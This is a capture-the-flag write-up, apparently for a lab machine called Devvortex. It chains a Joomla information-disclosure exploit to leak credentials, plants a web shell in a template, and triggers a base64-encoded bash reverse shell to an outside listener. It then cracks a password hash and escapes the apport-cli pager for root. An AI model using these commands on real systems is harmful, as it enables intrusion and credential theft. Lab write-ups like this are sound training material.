In http://dev.devvortex.htb/README.txt we found the Joomla version 4.2 and we found the CVE-2023-23752 with **[this exploit](https://www.exploit-db.com/exploits/51334)** in exploitDB, but that exploit was throwing errors. We found by the CVE **[this exploit](https://github.com/0xNahim/CVE-2023-23752)**

```bash
──(kali㉿kali)-[~/Documents/Boxes/Devvortex-10.10.11.242/CVE-2023-23752]
└─$ ./exploit.py -u http://dev.devvortex.htb
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered
Site info
Sitename:Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: False

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption: 0
```

So we get credentials lewis:P4ntherg0t1n5r3c0n## . Now we get inside and modify a template to get a shell

![[Pasted image 20231125205708.png]]

We use a encoded base64 reverse shell

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Devvortex-10.10.11.242]
└─$ echo 'bash -i >& /dev/tcp/10.10.14.22/9001 0>&1'|base64 
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMi85MDAxIDA+JjEK

URL ENCODED: echo+'YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4yMi85MDAxIDA%2BJjEK'|base64+-d|bash

┌──(kali㉿kali)-[~/Documents/Boxes/Devvortex-10.10.11.242/CVE-2023-23752]
└─$ curl http://dev.devvortex.htb/templates/cassiopeia/error.php?bmVsaWEK=echo+%27YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4yMi85MDAxIDA%2BJjEK%27%7Cbase64+-d%7Cbash

---------------

┌──(kali㉿kali)-[~/Documents/Boxes/Devvortex-10.10.11.242]
└─$ nc -nvlp 9001                                                                                                   
listening on [any] 9001 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.242] 51682
bash: cannot set terminal process group (862): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb/templates/cassiopeia$ whoami
www-data
```

Now, as we saw with the exploit we are facing a mysql db so connect to it

```bash
www-data@devvortex:/tmp$ mysql -h localhost -u lewis -pP4ntherg0t1n5r3c0n## joomla

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use joomla;
Database changed
mysql> show tables
    -> ;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
[...SNIP...]
| sd4fg_users                   |
[...SNIP...]
71 rows in set (0.01 sec)

mysql> select * from sd4fg_users;
[...SNIP...]
logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","ad","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} 
2 rows in set (0.00 sec)
```

Crack with john

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Devvortex-10.10.11.242]
└─$ john logan.hash -w=/usr/share/wordlists/rockyou.txt 
[...SNIP...]
tequieromucho    (?)  
```

Change user with `su logan`. For privilege escalation we check the sudoers

```bash
logan@devvortex:/tmp$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

And we find **[this vulnerability](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb)** so we have to execute as sudo the app and escape to get a shell

```bash
logan@devvortex:/tmp$ sudo apport-cli  -c /var/crash/_usr_bin_apport-cli.0.crash         
*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (45.7 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
.................................................................................

[...SNIP...]

WARNING: terminal is not fully functional
-  (press RETURN)!id
uid=0(root) gid=0(root) groups=0(root)
!done  (press RETURN)
!/bin/bash
root@devvortex:/tmp# whoami
root
```

And we are root